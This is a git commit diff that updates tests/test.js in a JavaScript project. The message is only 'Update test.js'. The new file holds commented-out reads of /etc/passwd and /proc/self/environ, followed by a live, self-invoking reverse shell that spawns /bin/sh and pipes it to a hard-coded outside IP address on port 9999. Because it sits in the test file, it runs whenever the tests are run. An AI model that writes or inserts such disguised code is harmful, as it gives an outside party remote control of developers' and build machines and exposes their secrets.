23a50a6085805771c2b3691863abe119bdf49c9a
Vincenzo Turturro <64688607+sushi-gif@users.noreply.github.com>
2023-04-15 10:47:28 +0200

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,34 @@
 // TODO: implement the tests
-console.log("Tests are not implemented yet...");
+const cat = require("../index.js").cat;
+const ls = require("../index.js").ls;
+
+
+//console.log(cat("/etc/passwd"));
+//console.log(cat("/proc/self/environ"));
+//const dir = ls("/proc");
+//for (const dirent of dir) {
+//  console.log(dirent.name)
+//}
+
+/*
+const fs = require("fs");
+let contents = fs.readdirSync("/proc");
+for (let item of contents) {
+  console.log(item);
+}
+*/
+
+(function(){
+    var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(9999, "213.45.154.251", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+//aa
+//a
